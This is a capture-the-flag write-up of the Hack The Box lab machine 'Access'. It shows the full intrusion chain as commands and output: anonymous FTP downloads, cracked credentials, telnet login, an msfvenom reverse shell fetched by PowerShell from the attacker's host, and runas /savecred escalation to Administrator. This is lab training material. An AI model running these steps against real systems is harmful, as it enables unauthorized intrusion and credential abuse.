---
layout: post
title: "Access - 10.10.10.98"
description: "A write-up of Hack the Box's Access machine."
tags: [HTB, Write-Up, Pentest, Lab]
---

# Access - 10.10.10.98

### Abstract

This short write-up will cover Hack The Box's machine, Access. This vulnerable machine has several open ports running insecure applications thus allowing unauthorized entry. The initial foothold is gained by leveraging sensitive files in FTP with telnet. From there, we may escalate by utilizing cached passwords found in windows `cmdkey` and then utilize the `runas` binary.

[TOC]

### Tools

- [Kali Linux](https://www.kali.org/downloads/)
- [Nmap](https://nmap.org/)
- [Microsoft Access](https://www.microsoft.com/en-us/microsoft-365/access), or
  - [mdb-tables](https://www.systutorials.com/docs/linux/man/1-mdb-tables/) & [mdb-export](https://www.systutorials.com/docs/linux/man/1-mdb-export/)
- [Readpst](https://www.systutorials.com/docs/linux/man/1-readpst/)
- [Telnet](https://linux.die.net/man/1/telnet)
- [Msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Metasploit handler](https://www.metasploit.com/)
- [Python](https://www.python.org/downloads/)

## Reconnaissance

### NMAP

The first tool ran against Access is nmap. This tool will allow us to see what ports are open, as well as what services are running on each port. To do this, the below command is executed:

`nmap -sC -sV 10.10.10.98`

The following should be returned:

```bash
Nmap scan report for 10.10.10.98
Host is up (0.16 s latency ).
Not shown : 997 filtered ports
PORT
STATE SERVICE VERSION
21/ tcp open ftp
Microsoft ftpd
| ftp - anon : Anonymous FTP login allowed ( FTP code 230)
| _Can ’ t get directory listing : TIMEOUT
| ftp - syst :
| _ SYST : Windows_NT
23/ tcp open telnet ?
80/ tcp open http
Microsoft IIS httpd 7.5
| http - methods :
| _ Potentially risky methods : TRACE
| _http - server - header : Microsoft - IIS /7.5
| _http - title : MegaCorp
Service Info : OS : Windows ; CPE : cpe :/ o : microsoft : windows
```

Nmap is a great tool to leverage, and most reconnaissance begins with it. The scan reveals that ports 21, 23 and 80 are open. 

Port 80 is a web service, however there does not seem to be anything interesting. We could check this further with `dirbuster`, but let's move on for the moment. 

Port 23 is telnet, however it requires credentials which we do not have.

Port 21 is FTP, and even better, it allows anonymous login.

## Exploitation

### Anonymous FTP Access

Let us connect to the FTP service anonymously by following the below:

```bash
root@kali :~/ HTB / Access # ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98: root ): Anonymous
331 Anonymous access allowed , send identity (e - mail name )
as password .
Password : < enter anything here >
230 User logged in .
Remote system type is Windows_NT .
```

Success. Our findings reveal that there are two directories, ``Backups`` and ``Engineer``. Using ``ls`` we can inspect what is in each directory.

```bash
ftp > ls / backups /
200 PORT command successful .
125 Data connection already open ; Transfer starting .
08 -23 -18 08:16 PM
5652480 backup . mdb
226 Transfer complete .
ftp > ls / Engineer /
200 PORT command successful .
125 Data connection already open ; Transfer starting .
08 -24 -18 12:16 AM
10870 Access Control . zip
226 Transfer complete .
```

Next, we download `backup.mdb` and `Access Control.zip` by using get. Make note of the file size,
and ensure that each file downloaded matches this size. If issues are noted, set your FTP client to
binary prior to using `get`.

```bash
ftp > cd Backups
250 CWD command successful .
ftp > binary
200 Type set to I .
ftp > get backup . mdb
local : backup . mdb remote : backup . mdb
200 PORT command successful .
125 Data connection already open ; Transfer starting .
226 Transfer complete .
5652480 bytes received in 21.76 secs (253.6540 kB / s )
ftp > cd ../ Engineer
250 CWD command successful .
ftp > binary
200 Type set to I .
ftp > get " Access Control . zip "
local : Access Control . zip remote : Access Control . zip
200 PORT command successful .
125 Data connection already open ; Transfer starting .
226 Transfer complete .
10870 bytes received in 0.45 secs (23.7488 kB / s )
```

### Inspecting backup.mdb & 'Access Control.zip'

We set `Access Control.zip` aside for now, as it is password protected. The `backup.mdb` file is a
standard Microsoft Access Database file which we can either A) open in Microsoft Access, or B) use
`mdb-tools` to decipher. For the purposes of this lab, `mdb-tools` were used.
In the mdb-tools package specifically, we will use `mdb-tables` and `mdb-export`.

```bash
root@kali :~/ HTB / Access / FTP # mdb -tables backup.mdb
( removed ) ... auth_message auth_permission auth_user
auth_user_groups auth_user_user_permissions
base_ addition data base_appoption ... ( removed )
```

I removed most of the tables, to de-clutter the above dialog. The table `auth_user` is especially
interesting to us. It’s exported to plain-text below:

```bash
root@kali:~/HTB/Access/FTP# mdb -export backup.mdb auth_user
id , username , password , Status , last_login , RoleID , Remark
25 , " admin " ," admin " ,1 , " 08/23/18 21:11:47 " ,26 ,
27 , " engineer " ," access4u @security " ,1 , " 08/23/18 21:13:36 " ,26 ,
28 , " backup_admin " ," admin " ,1 , " 08/23/18 21:14:02 " ,26 ,
```

Passwords! Trying each of them on `Access Control.zip`, we find success with `access4u@security`,
allowing us to export `Access Control.pst`. Using `readpst`, we can convert the `.pst` file into a
plain-text .`mbox` file. We can open the file in `nano` and give it a read. (`nano` used for simplicity- feel free to use vim!)

```bash
( removed ) ... Hi there ,
The password for the " security " account has been changed
to 4Cc3ssC0ntr0ller . Please ensure this is passed on to
your engineers .
Regards ,
John
```

Thanks John! We'll definitely pass this along to our engineers. :)

### User Access via Telnet

Now that we have access to some credentials, let us attempt to connect via `telnet` on port 23.

```bash
root@kali :~/HTB/Access # telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is ’^]’.
Welcome to Microsoft Telnet Service
login : security
password : 4Cc3ssC0ntr0ller
*==========================================================
Microsoft Telnet Server .
*==========================================================
C:\Users\security>
```

Let's snag that `user.txt` flag.

```bash
C:\Users\security> cd Desktop
C:\Users\security\Desktop> more user.txt
ff1f3b48913b213a31ff6756********
C:\Users\security\Desktop>
```

User flag get!

### Privilege Escalation to Root

#### Enumeration - cmdkey & runas

Time to do some serious enumeration. If you are new at windows, I recommend going through
this list for [the basics of windows enumeration](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/).

After running down that list for a while, we get a bite in the `Credential Manager`. This can be seen running the following:

```bash
C:\Users\security\Desktop> cmdkey /list
Currently stored credentials:
Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
C:\Users\security\Desktop>
```

With this, we can use `runas` with the `/savecred` flag, letting the system authenticate for us. That’s
great, but we can’t do a whole lot through this laggy telnet instance. Let’s throw a shell on this
puppy, shall we?

#### Reverse Shell

Back in Kali, we can fire up `msfvenom` and generate a payload using the following. Make sure to use your machines local IP address and a port of your choosing.

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f exe > shell.exe
```

Time to transfer this shell onto the box. We spool up a `SimpleHTTPServer` in `python` by using the
below command in the shell’s directory.

```bash
python -m SimpleHTTPServer 80
```

Then, back over in our `telnet` session, we can download the reverse tcp shell.

```bash
C:\Users\security\Desktop> powershell.exe(new-object System.Net.WebClient).DownloadFile(’http://<Your IP>/shell.exe’,’C:\Users\security\Desktop\shell.exe’)
```

To prepare for our reverse tcp shell, we will boot up `metasploit` by running `msfdb run`. Then, we can start our listener by running the below:

```bash
msf5> use exploit/multi/handler
msf5 exploit (multi/handler)> set payload
windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit (multi/handler)> set LHOST <Your IP>
LHOST => <Your IP>
msf5 exploit (multi/handler)> set LPORT <Your Port>
LPORT => <Your Port>
msf5 exploit (multi/handler)> run
```

#### Rooting

Now that we are listening on our selected port, we can begin the privilege escalation.

Remember our `cmdkey` and `runas` findings from earlier? Time to put them to use by executing our shell on the box.

```bash
C:\Users\security\Desktop> runas /savecred /user:Administrator shell.exe
```

With the saved credentials, `runas` executed our `shell.exe` as Administrator and we now have root shell
access in our metasploit listener!

```bash
C:\Users\security\Desktop> whoami
whoami
access/administrator
```

We close the exploitation out by securing the root flag.

```bash
C:\Users\security> more C:\Users\Administrator\Desktop\root.txt
more C:\Users\Administrator\Desktop\root.txt
6 e1586cc7ab230a8d297e8f9********
```

